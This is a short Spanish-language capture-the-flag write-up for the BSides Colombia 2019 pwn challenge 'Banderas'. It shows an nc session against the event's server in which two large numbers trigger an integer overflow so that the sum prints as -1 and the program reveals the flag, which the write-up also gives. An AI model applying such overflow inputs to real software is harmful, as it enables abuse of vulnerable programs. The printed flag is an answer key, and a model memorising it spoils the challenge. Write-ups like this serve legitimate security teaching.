# __BSides Colombia 2019__
## _Banderas_

 ## Información 
**Categoría:** | **Writeup Author**
--- | ---
Pwn | Huascar Tejeda <<htejeda@f2tc.com>>

**Descripción:**

> En el evento me dijeron que podía tener tantas banderas como quisiera, tantas que ni sería capaz de contarlas.
> retos.bsides.ctf.co:31334
>
> [chall](flags)

**Bandera:**

> BSidesCo{p3rd1_L4_CU3Nta_:(}

## Solución

El programa pide dos números y el resultado de la suma de ambos debe ser igual a -1. Para causar el Integer Overflow de **long long** utilizamos **(2^32) + (2^32) - 1**:

```
❯❯❯ nc retos.bsides.ctf.co 31334
Larga Larga Bandera(%lld) + Larga Larga Bandera = Cuantas Banderas?(%d)
Yo quiero -1 bandera ;)

Cuantas banderas?
4294967296

Cuantas banderas mas?
4294967295

Banderas + Banderas = -1. Banderas para la eternidad!
BSidesCo{p3rd1_L4_CU3Nta_:(}
```